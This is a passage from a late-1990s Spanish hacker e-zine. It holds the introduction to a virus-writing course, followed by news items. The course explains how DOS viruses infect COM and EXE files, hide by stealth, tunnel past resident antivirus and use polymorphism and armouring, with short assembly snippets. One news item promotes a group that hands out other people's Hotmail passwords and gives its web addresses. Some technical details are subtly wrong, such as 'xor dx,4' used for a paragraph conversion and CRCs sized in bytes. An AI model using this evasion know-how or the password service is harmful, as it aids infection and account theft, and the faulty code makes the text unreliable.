ejemplo, cuando leemos un fichero en ASM mediante una interrupción le 
pasamos al DOS la dirección de
memoria donde queremos que este meta los datos leídos del fichero, pero 
cuando le pedimos que nos
diga qué ficheros encuentra que coincidan con '*.COM' la respuesta es 
enviada al DTA, ya que no le
pasamos un dirección. Por defecto se encuentra a partir del byte 80h 
del comienzo del segmento del
programa (ver diferencias entre un COM y un EXE) y es la misma zona que 
usa el DOS para pasar los
parámetros de la línea de comandos a un programa por lo que si vamos a 
usar la DTA deberemos
relocalizarla primero fuera de dicha zona o perderemos la información
 sobre dichos parámetros.
Relocalizarla es tal fácil como hacer:

mov ah,1ah lds dx,dirección_del_nuevo_dta int 21h

Lo normal es que el virus se cree su propio DTA para no interferir con 
los parámetros que se le hayan
podido pasar al programa infectado y luego restaura la DTA antes de salir.

¿Sabes lo que es un MCB? Memory Control Block. Es una zona de memoria que 
se encuentra justo
antes de cada bloque de memoria que reserva el DOS para uso de un programa 
que indica cuánta
memoria se ha reservado, por qué programa y cual es el siguiente bloque. 
De este modo un virus puede
reservar memoria para si mismo mediante la modificación directa de estos MCBs.

¿Sabes lo que es el MBR? Es el Master Boot Record. Está presente en el 
sector 0 de cada disco duro,
y contiene además de una porción de código ejecutable la tabla de partición. 
Puede crearse un MBR
nuevo mediante la ejecución de FDISK /MBR, en caso de sospecharse que este 
pueda haber sido
infectado. Algunos discos duros de gran capacidad (>512 megas) instalan en 
el MBR su propia rutina
para poder engañar al DOS y hacerle creer que son menores de lo que 
realmente son, ya que el DOS no
puede trabajar con discos de tamaños >512 megas, de ahí que debemos 
ser cuidadosos. En cualquier
caso, la destrucción del código ejecutable del MBR no es demasiado 
peligrosa, ya que siempre podemos
restaurarlo mediante el FDISK o mediante las utilidades que nos entregaron
 con el HD, pero sí es más
peligroso destruir la tabla de particiones, ya que si no recordamos los 
valores que contiene podríamos
perder el acceso al disco duro.

¿Sabes lo que es un CRC? Ciclyc Redundant Check. Es una forma de 
comprobar de forma unívoca
que el contenido de un archivo no ha cambiado, mediante una operación 
matemática que afecta a cada
byte del archivo y genera un número (de generalmente 16 ó 32 bytes) para 
cada archivo. Una vez
obtenido este número las posibilidades de que una modificación del archivo
 dé el mismo número son
pequeñísimas. De ahí que haya sido un método tradicionalmente muy utilizado
 por los antivirus para
comprobar si el programa había sido modificado por un virus, guardando
 para cada directorio un archivo
con los CRCs de cada archivo del mismo y comprobándolo periódicamente o 
al ejecutar cada archivo (en
caso de un antivirus residente o uno que modifique directamente el 
ejecutable para que se auto chequee
cada vez que se ejecute, lo cual ya no se usa porque daba muchos problemas 
y falsas alarmas). Otro
método de comprobar la integridad de un archivo son los checksums o sumas
 de control que son mucho
más sencillas y rápidas pero de menos fiabilidad. De hecho el método de 
los CRCs es tan potente que
muchos antivirus son capaces de reconstruir el archivo antes de ser 
modificado a partir de la información
de estos. Esta técnica a dejado de ser segura debido a la aparición de virus
 stealth (invisibles) que son
capaces de hacer que un archivo infectado aparezca a los ojos del programa
 que calcula el CRC como
estaba antes de infectarlo (ver más adelante).

¿Sabes en qué se diferencia un COM de un EXE? La diferencia principal es
 que un COM sólo puede
ocupar un segmento 64 K y un EXE puede ocupar toda la memoria por debajo
 de 1 mega (sin contar que
el programa esté hecho en modo protegido). Pero para nuestros fines la
 diferencia principal radica en la
forma diferente que tiene el DOS de cargar y ejecutar estos programas.
 Veamos como carga el DOS un
COM o un EXE. Primero se crea un PSP (Program Segment Prefix) que ocupa 
los 100h primeros bytes
del segmento que ocupa el programa. El programa en sí se carga a partir
 de 100h. El PSP guarda alguna
información sobre el programa que se encuentra justo después de él. 
Además como vimos contiene a la
DTA y/o a los parámetros (por defecto). Si se trata de un archivo COM el 
programa comienza a
ejecutarse a partir de 100h, si se trata de un EXE el programa se ejecuta
 a partir de los datos
especificados en la cabecera del mismos que son los primeros bytes del 
archivo ejecutable. No debe
confundirse el PSP con la cabecera de un EXE. La cabecera de un EXE son 
los primeros bytes del
archivo y el PSP se crea para cualquier programa ejecutable en la memoria
 (COMs o EXEs). En realidad
existen otros programas ejecutables como son los controladores de 
dispositivos (Device Drivers) que se
instalan en el config.sys o los cero code start, que son archivos que 
se ejecutan antes de que se haya
cargado el dos (IO.SYS y MSDOS.SYS por ejemplo). En un COM por tanto el 
primer byte del archivo
corresponde con el primer byte que se ejecutará, en un EXE en cambio los
 primeros bytes corresponden
a una cabecera que principalmente ofrece información sobre el punto de 
entrada al archivo, es decir,
sobre el byte a partir del cual se ejecutará dicho ejecutable. Además 
contiene la tabla de relocalización
que sirve para cambiar los saltos absolutos (los no relativos) que 
contiene el EXE de modo que este
pueda ejecutarse independientemente de la dirección de memoria donde resida 
(para la distinción entre
saltos absolutos y relativos consultar el curse de ASM de Pablo ;)

¿Sabes hacer un programa residente? Un programa residente TSR 
(Terminate and Stay Resident) es un
programa que al terminar su ejecución no libera la memoria que le había 
sido asignada por el DOS, pero
sí devuelve el control a este. Sirven generalmente para instalar rutinas 
en memoria, en la mayor parte de
los casos gestores de interrupción. Para dejar un programa residente hay 
dos métodos, el primero es
mediante la modificación de los MCBs y el segundo mediante una llamada al DOS:

mov ah,31h mov al,error_level mov dx,tamaño_de_la_porción_residente a partir 
del PSP) xor dx,4 (para
pasar dx a párrafos) add dx,16 (para reservar espacio para los 100h bytes del 
PSP) int 21h

Para conocer el tamaño de la porción residente lo más conveniente es poner 
una etiqueta donde comienza
y otra donde acaba y hacer la resta de ambas.

¿Sabes programar un tracer (paso a paso)? Un tracer es un rutina que pone
 la CPU en modo paso a
paso es decir, que cada vez ejecute una instrucción llamará a la int 1h. 
Existen diversas técnicas usadas
por los virus y otros programas para evitar que un tracer explore su código 
(armouring). Para evitar esto
último hay que programar con mucho cuidado de modo que cada vez que se 
ejecuta una instrucción
miremos a la siguiente para ver si se trata de una instrucción capciosa 
aunque es un proceso laborioso y
difícil... en general el procedimiento consiste en instalar un gestor de
 la interrupción 1 y activar el flag de
paso a paso:

pushf pop ax or ax,100h push ax popf

Un tracer es muy útil cuando queremos supervisar la ejecución de un 
programa de forma automática. Los
virus usan esta técnica para labores de tunneling (ver más adelante).

¿Sabes usar algún debugger? Un debugger es como un tracer pero con control
 en tiempo real por parte
del usuario. Es muy recomendable tener uno a mano para pillar los bugs que
 derivan de la programación
de antivirus ;)

¿Sabes la diferencia entre un virus y un troyano? Un virus es una porción
 de código ejecutable que se
añade a otra ya existente. Los virus se ejecutan sin intención por parte 
del usuario, que no sabe que el
programa en cuestión contiene un virus. Un troyano es un programa con
 entidad propia que generalmente
se construye para labores destructivas. Es el usuario el que confiando 
en el programa lo ejecuta creyendo
que se trata de un programa de algún otro tipo.

¿Sabes cómo se produce la infección de un archivo? El virus modifica el
 programa a infectar de tal
modo que se ejecute su código en vez del código del programa original. 
Salvo los virus de enlace todos
los virus necesitan modificar el programa original.

¿Sabes lo que es un virus 'stealth'? Es un virus que mediante algunas 
técnicas consigue ocultar su
existencia a los antivirus y en general al DOS. Para ello necesita estar 
residente antes que los antivirus.
Modifica la información que los antivirus obtiene de modo que parezca que 
el archivo es normal. Para
ello existen diversos métodos, ya que son diversos los métodos que el DOS 
usa para manejar archivos.
Principalmente son el trabajo físico con el disco (a base de leer sectores)
, los FCBs (método obsoleto), y
la apertura del archivo mediante handles (método vigente).

¿Sabes lo que es un 'handle stealth'? Es un virus que utiliza técnicas stealth 
de modo que cada vez que
un programa abre un handle para leer/escribir un archivo, modifica los datos 
del handle para que parezca
que el programa es normal. Es decir, aunque el programa sigue estando infectado 
no es posible ver el
verdadero programa sino solo la copia sin infectar que nos muestra el virus. > 
¿Sabes lo que es un
'infector/disinfector'? Es justo la técnica contraria, cuando el virus advierte
 que se está abriendo un
programa infectado lo desinfecta y sólo vuelva a infectarlo cuando el archivo 
es cerrado. Es un método
más sencillo de implementar que el 'handle stealth'.

¿Sabes lo que es un virus con 'tunneling? Cuando un antivirus queda residente
 instala sus propios
gestores de interrupción para interrupciones que puedan serle útiles a un virus
. De ese modo puede dar la
alarma cuando un virus efectúe una operación extraña a través de una de estas 
interrupciones. Un virus
con tunneling intenta averiguar la dirección de los gestores de interrupción
 del DOS antes de que quedara
residente el antivirus. Esto es posible porque como dijimos con anterioridad,
 el antivirus tiene que
devolver el control a los gestores del DOS en algún momento para permitir que
 el DOS haga su trabajo.
Las técnicas principalmente son dos: hacer un tracing, o buscar saltos a lo 
largo del código del gestor del
antivirus que salten al DOS. Para ello necesitan conocer el segmento del DOS, 
lo cual se hace a través de
una interrupción indocumentada del DOS. En realidad son métodos poco fiables
 dado que son bastante
evidentes y a veces condenados al fracaso. Muchos antivirus residentes 
averiguan que un virus les está
haciendo un tunneling y lo detiene. Cuando desarrolle el tema expondré
 algunas técnicas que he
descubierto hace poco, que subsanan la mayoría de los problemas de los
 tunneling tradicionales. Aunque
hasta la fecha ningún virus las incorpora, es bueno anticiparse a los 
fallos del DOS y taparlos antes de
que esto ocurra, de ahí mi interés por esta técnica ;) Otras técnicas 
se basan en el acceso al disco
directamente a través de los puertos, es decir sin necesidad de llamar 
a ninguna interrupción. Este método
presenta el inconveniente de que no siempre funciona, por lo que es poco
 probable que un virus lo
incorpore.

¿Sabes lo que es un virus polimórfico? Es un virus que modifica su 
apariencia en cada infección. Esto
lo consigue encriptándose con una clave diferente en cada copia que
 hace de si mismo. Esto dificulta
mucho las labores de búsqueda de cadenas por parte de los antivirus, 
que sólo pueden fijarse en las
rutinas de desencriptación o utilizar técnicas de otro tipo. Para 
dificultar aún más la búsqueda de cadenas
un virus realmente polimórfico debe variar también la apariencia de su 
rutina de desencriptación,
mediante la inserción de NOPs aleatorios (instrucción ASM que no hace nada) 
y mediante la utilización
de distintos registros y loops para realizar la desencriptación. Se ha 
popularizado para este fin la
realización de motores de encriptación que son rutinas que desarrollan 
estas técnicas de un modo general
y que se añaden a un virus ya completo que no incluía polimorfismo.

¿Sabes lo que es un virus con 'armouring'? Es un virus que utiliza 
técnicas para dificultar ser
desensamblado o traceado. No tienen otro fin que este, pero dado que
generalmente cuesta muy poco
realizarlas es bastante popular que un virus las incluya, aunque también
 pueden dar lugar a que un
antivirus heurístico lo detecte. Ultimamente también se han popularizado
 técnicas de armouring que
actúan contra un antivirus específico, evitando las combinaciones de
 bytes que se conoce que activan la
alarma heurística o desactivando el antivirus residente en memoria 
(mal llamado tunneling).

¿Has hecho alguna vez un virus? Hacer un virus es una cosa divertida,
 con la cual se aprende mucho,
pero que está penada por la ley. Es mejor combatir esta lacra estudiando
 a fondo sus técnicas y
evitándolas, intentando siempre ir un paso por delante de los desarrolladores 
de virus.

¿Sabes infectar COMs? La infección de un COM se hace generalmente modificando
 los primeros bytes
de modo que la ejecución comience por la rutina vírica que se añade al programa
 original a partir de su
fin (virus appending). Después de la ejecución del virus se restaura en memoria
 los 3 primeros bytes del
archivo original y se le ejecuta. De este modo el usuario no nota que el programa
 está infectado. Otro
método cada vez más en desuso es el de sobreescribir el código original del 
programa (virus overwritting).
De este modo el programa original no puede ser ejecutado y el virus se delata
 con facilidad. Por supuesto
puede insertarse el código del virus al principio, pero es una técnica que no 
se usa demasiado.

¿Sabes infectar EXEs? La infección de un EXE por el contrario no precisa de 
la modificación del
programa original. Se añade el código al final y se modifica la cabecera del 
EXE de tal modo que el punto
de entrada cambie a la rutina vírica, que después cede el control al punto 
de entrada original. También se
usan técnicas como insertar el código del virus en el stack del EXE (zona
 'hueca' que puede o no estar
presente en el archivo).

¿Sabes lo que es un virus de enlace? Es una modalidad de virus que no precisa 
modificar el archivo que
infecta. Para ello lo que hace es modificar la FAT de modo que el comienzo del
 archivo siempre apunte a
un sector que contiene el virus. Se ejecuta este y carga el programa original.
 No son muy populares dado
que precisan de un mayor trabajo y no son en general fáciles de detectar.

¿Sabes cómo funciona una búsqueda heurística? Ya la he mencionado numerosas 
veces en el texto. Es
una técnica antivirus que evita la búsqueda de cadenas. Para ello lo que hace 
es desensamblar el
programa y ejecutarlo paso a paso, a veces mediante la propia CPU, a veces 
mediante una emulación. De
ese modo averigua qué hace exactamente el programa en estudio e informa al 
usuario. Generalmente es
difícil de implementar de un modo automática ya que se desconoce el conocimiento
 del usuario. Esto da
lugar a un compromiso entre potencia del método y falsas alarmas. En general 
es una buena técnica si se
implementa bien y el usuario tiene un alto conocimiento técnico. La mayoría 
de los virus nuevos evitan
directamente la búsqueda heurística modificando los algoritmos hasta que el
 programa antivirus no es
capaz de indentificarlos.

Bueno pues esto es todo por hoy. No es que vayáis a aprender nada nuevo pero
 quedan sentados unos
conocimientos básicos y un lenguaje a utilizar en el resto del curso. 
Preguntas... ya sabéis las que queráis
;)

Existen muchos puntos que no están suficientemente detallados, cuando
 sea necesario desarrollaré cada
uno, así que no me preguntéis sobre eso a raíz de esta introducción, 
esperad a que llegue a ese capitulo ;)

Patuel. 
((((((((((((((((((((((((((((((((ZeD-wOrLd-EzInE nº3)))))))))))))))))))))))))))))))))))))))))))


                  -/-/-/-/-/-/-/---/-/-/-/-/-/-/-/
                  ||         NOTICIAS           ||
                  -/-/-/-/-/-/-/---/-/-/-/-/-/-/-/


NO ME HAGO RESPONSABLE DELOS POSIBLES COMENTARIOS U OPINIONES DE LOS REDACTORES
DE LAS SIGUIENTES NOTICIAS,SI NO ESTAS DEACUERDO CON ELLAS....MALA SUERTE ;-)


************************************************************************************************
Cuatro “hackers” españoles pertenecientes al grupo “m3 k”, que
habían entrado sin autorización en servidores web de universidades y
empresas de España, México, Estados Unidos, Alemania, Suecia y Corea
del Sur, fueron detenidos ayer en Madrid y Canarias por la Guardia
Civil, según la información que facilitó este cuerpo policial. Esta es
la segunda detención de hackers que practica esta año la Guardia
Civil, después de que en abril arrestara a tres miembros del grupo
“!Hispahack”. Los detenidos ayer en Madrid son “dAb”, líder del grupo,
y “WEEZER”. En Canarias, son “iceman”, en Las Palmas; y “canario”, en
Arrecife. La Guardia Civil les imputa, además, numerosos ataques a
redes de ordenadores de Granada, Asturias, Tarragona y Madrid, y
universidades de Madrid, Valencia, Salamanca, Oviedo, Valladolid,
Barcelona y Las Palmas.

La investigación se inició hace seis meses, bajo el nombre de
“Operación Nevada”, a raíz de las denuncias presentadas por varias
empresas por sustracción de contraseñas. Siempre según las mismas
fuentes, dado que no existe otra información, los intrusos entraban
utilizando un programa denominado “rookit”, que permite obtener
privilegios máximos de acceso a través de Internet. Una vez dentro,
copiaban ficheros de datos personales y claves de usuario, y los
almacenaban en una cuenta de Hotmail. Desencriptaban las “password”
utilizando un software disponible en Internet denominado “John, the
Ripper”.

La Guardia Civil, http://www.guardiacivil.org , que dispone de todo un
departamento dedicado a Internet, siguió su rastro informático y, más
tarde penetró en los domicilios de los “delincuentes”, como los
caracteriza. Allí intervino ordenadores, CD Rom, disquetes y manuales
de hacking

"Veremos esta accion policial en que queda a ver si hacen la misma tonteria
que a los miembros de  hisahack a los que les imputaban mas cargos de los
reales"
********************************************************************************************************************************************************
hay por ahi un grupo de ..."hackers" ... a los 
que si les mandas un mail diciendoles las razones de porque 
quieres saber una clave de un buzon de hotmail, ... si les 
convences te dan la clave, pero en fin, no te aconsejaria esto, 
porque mas bien parecen unos ... bueno, aqui te va su web:
Mejor dicho, aqui te pego el mensaje que explica esto:
----------

Tronkos alucinante hay unos hacker que se llaman munga bunga 
ke me han
conseguido un password de hotmail han tardado unos dias pero 
me lo han
mandado y funciona hay que darles una razon de 250 palabras de 
por que
quieres la password de ese tio o tia si les convences te lo dan la 
direccion
es www.geocities.com/wallstreet/market/1983
--------------

la nueva direccion de este grupo de hackers de hotmail es
www.geocities.com/siliconvalley/garage/4339
------------
********************************************************************************************************************************************************
huevo de pascua en el office97
-------------------------
Los que tienen Oficce 97 entren en EXCEL luego opriman la tecla F5 y luego escriban en el cuadro de dialogo 
------>    X97:L97
------>    luego la tecla tab (|<---
                               --->|)   
------>   despues mantengan oprimida las teclas control y shift y despues el asistente de graficos encontraran algo bacanisimo.
************************************************************************************************
El pleno del Congreso de los Diputados aprobó hoy con la totalidad de
los votos de la Cámara la moción
 del grupo parlamentario socialista en el punto en que solicita al
Gobierno que de los pasos necesarios
 para el establecimiento de una "tarifa plana" para los usuarios de
Internet. Dicho punto contó con el
 apoyo -además de PSOE, IU y Grupo Mixto- de CiU y del PP que finalmente
se sumó a la iniciativa.

 El punto aprobado "insta al Gobierno a adoptar los pasos necesarios
para el establecimiento de una tarifa
 plana por el acceso a Internet por parte de usuarios residenciales,
pymes, y en centros educativos y
 sanitarios".

 El resto de los puntos que incluía la moción del PSOE -derogación de la
última orden de tarifas reducción
 de tarifas de interconexión y eliminación de restricciones a las
llamadas locales- fueron rechazados con
 los votos de PP y nacionalistas.

 La postura de los catalanes, la más esperada, se decantó finalmente por
apoyar la moción socialista, por
 entender que en el contexto de un sector liberalizado la última subida
de las tarifas locales era una
 medida "grave, injustificable y lamentable por parte de la antigua
compañía monopolística, con el apoyo
 del Gobierno, que perjudica notablemente el desarrollo de Internet",
según señaló el portavoz del Grupo
 catalán, Lluis Recoder.

 En este sentido, CiU presentará la próxima semana una proposición no de
ley en esta misma línea en la
 que no sólo pedirá una tarifa plana de Internet sino que exigirá que
dicha tarifa se ajuste a la media de las
 tarifas que aplican de los países más competitivos de nuestro entorno.
Asimismo, incluirá en su
 proposición otro punto que exige al Gobierno que obligue a Telefónica a
no cobrar las conexiones fallidas.

 Lluis Recoder indicó que la reciente subida de las tarifas locales no
se entendía porque estaba seguro de
 que cuando se afiance la competencia será la propia Telefónica la que
presionará a la baja los precios de
 Internet.

 La portavoz del Grupo Popular, Ana Mato, presentó una enmienda a la
propuesta socialista en la que,
 aunque apostaba por una rebaja de las tarifas locales y de Internet, no
precisaba ninguna fórmula
 concreta por entender que al imponer la tarifa plana a Telefónica como
fórmula de ese abaratamiento
 podrían surgir problemas jurídicos. La enmienda fue rechazada y,
finalmente, el PP se sumó a la iniciativa
 socialista en este punto. El portavoz socialista, Jesús Caldera,
reiteró la argumentación conocida de su
 grupo de que la última reestructuración tarifaria suponía la mayor
subida de tarifas de la historia e hizo
 especial hincapié en el retroceso que eso supone para el desarrollo de
Internet.
siquieres mas informacion------http://come.to/hwarez
*********************************************************************************************************************************************************
La semana pasada fue hallado un nuevo agujero de seguridad en el
navegador de Netscape por Dan Brumleve, un consultor informático
independiente de Sunnyvale, California, de 20 años de edad. Anunció su
descubrimiento en un mensaje enviado a los grupos de news
(http://www.shout.net/~nothing/cache-cow/article.txt): un fallo en la
implementación de JavaScript del navegador de Netscape que permite que
cualquiera pueda leer los contenidos de tu caché, donde se almacenan las
direcciones de los sitios Web que has visitado e incluso la información
confidencial que hayas introducido en los formularios, como passwords,
tarjetas de crédito y otros datos personales, siempre y cuando no hayan
sido protegidos utilizando un software criptográfico. La amenaza a la
intimidad personal que representa este fallo es tremenda, ya que, en
cierto sentido, el caché almacena la información de lo que has estado
haciendo en la Web durante las últimas semanas (la mayor o menor
cantidad de información dependerá del tamaño del caché, configurable por
el usuario) y gracias al agujero podría caer en manos poco escrupulosas.

Podéis comprobar qué contiene exactamente el caché escribiendo
“about:cache” o “about:global” en el recuadro de dirección del
navegador.

El fallo afecta a todas las versiones del navegador de Netscape
anteriores a la 4.06, pero no a Microsoft Internet Explorer.

Netscape confirmó la existencia del fallo y anunció que lo solucionaría
cuando lanzase la versión final de Netscape Communicator 4.5, lo cual
ocurrirá “muy pronto”.

En sus declaraciones a la prensa, Brumleve afirmó que este fallo le
preocupa porque “significa que un sitio Web de elevado tráfico podría
utilizarlo para averiguar a qué otros sitios Web van sus visitantes”.
Dijo que incluso podría ser utilizado por los jefes para comprobar si
sus empleados han estado buscando pornografía, por ejemplo.

Richard M. Smith, director de Phar Lap Software Inc.
(http://www.pharlap.com/), sugirió que el fallo podría ser explotado
incluso usando correos en formato HTML o mensajes a grupos de noticias
como Usenet, aumentando así significativamente el riesgo para la
intimidad de los usuarios de Internet.

En palabras de Marc Rotenberg, director de Electronic Privacy
Information Center (http://www.epic.org), “es éste un problema muy serio
de privacidad, que pone de relieve la actual falta de estándares
técnicos adecuados para proteger la privacidad en línea.”

Solución

Ahora mismo, y mientras Netscape no lance un parche, existen dos únicas
maneras de protegerse:

a) Desactivar JavaScript del navegador:
Seleccionar Editar-->Preferencias-->Avanzadas y ahí eliminar la confirmación
de la casilla Activar JavaScript.

b) Establecer el valor del caché a 0:
Seleccionar Editar-->Preferencias-->Avanzadas-->Caché y ahí establecer los
valores de caché de memoria y de disco a 0 (ah, y no olvides pulsar los
botones de limpiar caché de memoria y limpiar caché de disco).

No es necesario desactivar Java, ya que este fallo no tiene nada que ver
con ese otro lenguaje.

Más información

La página Web creada por el propio Brumleve para demostrar su
funcionamiento, con ejemplos y explicaciones, así como el código fuente
para reproducirlos, disponible en:

http://www.shout.net/~nothing/cache-cow/
*********************************************************************************************************************************************************
=---==---==---==---=[ www.infotel.com.mx ]=---==---==---==---==---
 
 Otra pagina fue hackeada, esta vez por 2 brasileqos que se hacen
 llamar " Funboy & BauDKiLLer ". La pagina es de un servidor mexicano
 haciendo tributo a el grupo [X-Ploit] (el cual ha hackeado servidores
 del gobierno mexicano) y protestando contra la corrupcion y contra
 el presidente de la Republica, Ernesto Zedillo.
*********************************************************************************************************************************************************
 ALGO MARAVILLOSO ESTA A PUNTO DE SUCEDER...
 "2001, Una Odisea del Espacio (Arthur C. Clark)"
 
 No he encontrado una mejor frase para empezar nuestro comunicado de hoy, porque esta es la
 verdadera verdad y mas si nos pasamos por la pagina del seguimiento de la coordinadora de
 huelgas. Si no teneis ganas de ir ahora sus lo adelanto un poquito: Se ha secundado la huelga
 en  casi un 70%, es decir casi un 27% mas que la otra vez. Esta claro al ser Sabado, las 
 empresas estaban cerradas y eso se ha notado. Ahora veremos que dicen los mentirosos de la 
 Timo... ya lo veo venir, "la huelga al ser sabado, la gente decidio quedarse en casa y no 
 salir de paseo, de fiesta y esas cosas que normalmente hacen y se conectaron todos a 
 Internet, con lo cual queda decir que el modelo de redes interconectadas que no permiten 
 la tarifa plana en España, es decir en otras cifras, la huelga ha sido seguido solo por 4
 personas y un gato, que no se enteraron de que exisitia,con lo cual reforzamos nuestra 
 posicion de mercado y seguimos en nuestras trece de no daros tarifa
 plana. Pero como esta huelga ha sido un fiasco, a partir de ahora sus obligaremos a 
 dirigiros a nuestra empresa con el termino Excelentismo Sr. Pillalonga y asesores..." 
 Fdo. Timofonica.es (que es diferente del .com, quede claro).
 
 Nosotros hemos puesto los resultados a "nuestro modo" , una manera un tanto informal de 
 seguir una huelga o boicott, pero que sus hara pasar un buen rato. A lo largo del dia 4
 (CUATRO) que se vea bien, segun vayamos teniendo mas informaciones, sus iremos informando.
 Si ya se que es Domingo, pero despues de que ayer no me pude conectar... tengo un mono 
 retrasado (por no hablar de los 437 mails pendientes -normalmente tengo 3 o 4 veces mas-)
 de 24 horas y eso es muy fuerte.
 
 Bueno recordad, que hoy dia 4 es el ultimo dia para añadir tus datos a la lista para ser 
 borrado de la AUI, que el dia 5 (a mas tardar el 6, enviaremos la carta a estos "señores"
 para que sus borren, veremos que contestan. Bueno mejor dicho, la carta la enviara nuestro
 abogado principal, ellos sabran lo que hacen si no nos hacen caso. No sus gustaria verlos 
 en un tribunal por negarse a acatar las leyes??? Seria una pasada, nop?
((((((((((((((((((((((((((((((((ZeD-wOrLd-EzInE nº3)))))))))))))))))))))))))))))))))))))))))))
  
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                [        DESPEDIDA Y CIERRE            ]
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Bueno,pues esto se acabo.Un nº mas en la red,del cual espero que saques el mayor provecho 
posible.Espero que lo hayas disfrutado,que los articulos que he presentado este nº te hayan
valido de algo y que al igual que la gente que ha colaborado en este nº,te animes y mandes
ese articulo que has escrito sobre h/c/p/v/ a zed@mixmail.com para que salga publicado aqui,
en tu e-zine favorito (o al - eso pretendo).
Recuerda que en la web de ZeD-wOrLd siempre podras encontrar cosas utiles,programas,manuales,
bugs,noticias,nºs de serie,el ZeD-wOrLd-ScRiPt,para que tus sesionesde irc se alegren un 
poco +,.....en fin todo lo que quieras lo podras descubrir en esta direccion de web:
http://www.angelfire.com/ak/HACKZED/ZED2.html
espero que la disfrutes tanto como seguro has disfrutado este tercer nº del ZeD-wOrLd-EzInE.
Espero estar dentro de poco con vosotros con nuevos articulos y cosillas interesantes,
un saludo a todos.
Byez

->->->->->->->->->->->->->->->ZeD->->->->->->->->->->->->->->->->->->->->->->->->->->->->->->
 si controlas tu mente....¿por que dejas que alguien controle tus actos??

